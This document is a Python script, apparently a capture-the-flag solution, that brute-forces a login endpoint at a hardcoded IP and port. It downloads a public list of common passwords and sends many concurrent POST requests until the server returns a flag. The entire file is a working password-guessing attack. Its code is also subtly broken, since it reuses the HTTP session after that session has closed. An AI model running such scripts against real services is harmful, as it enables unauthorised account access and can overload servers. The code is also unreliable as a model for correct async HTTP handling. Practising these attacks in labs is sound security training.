import asyncio
import aiohttp

# Server information
ip = "94.237.54.42"  # Replace with your server IP address
port = 32157         # Replace with your server port number
url = f"http://{ip}:{port}/dictionary"

# URL for downloading the password list
password_list_url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt"

async def try_password(session, password):
    """
    Attempt a single password by sending a POST request.
    """
    data = {'password': password}
    async with session.post(url, data=data) as response:
        if response.status == 200:  # Successful response
            json_data = await response.json()
            if 'flag' in json_data:  # Check if the response contains the flag
                print(f"✅ Correct password found: {password}")
                print(f"🏴 Flag: {json_data['flag']}")
                return True
    return False

async def main():
    """
    Main function to orchestrate the dictionary attack.
    """
    print("🔄 Downloading password list...")
    
    async with aiohttp.ClientSession() as session:
        # Fetch the password list
        async with session.get(password_list_url) as response:
            if response.status != 200:
                print("❌ Failed to download the password list.")
                return
            password_list = (await response.text()).splitlines()
    
    print(f"✅ Password list downloaded: {len(password_list)} passwords.")
    
    # Limit concurrent requests to avoid overwhelming the server
    semaphore = asyncio.Semaphore(100)
    tasks = []

    async def task_wrapper(password):
        async with semaphore:
            success = await try_password(session, password)
            if success:
                for task in tasks:
                    task.cancel()  # Cancel remaining tasks
                return True

    # Create asynchronous tasks for each password
    for password in password_list:
        tasks.append(asyncio.create_task(task_wrapper(password)))

    # Wait for all tasks to complete or be canceled
    try:
        await asyncio.gather(*tasks)
    except asyncio.CancelledError:
        pass

if __name__ == "__main__":
    print("🚀 Starting dictionary attack...")
    asyncio.run(main())
    print("🎯 Attack completed.")
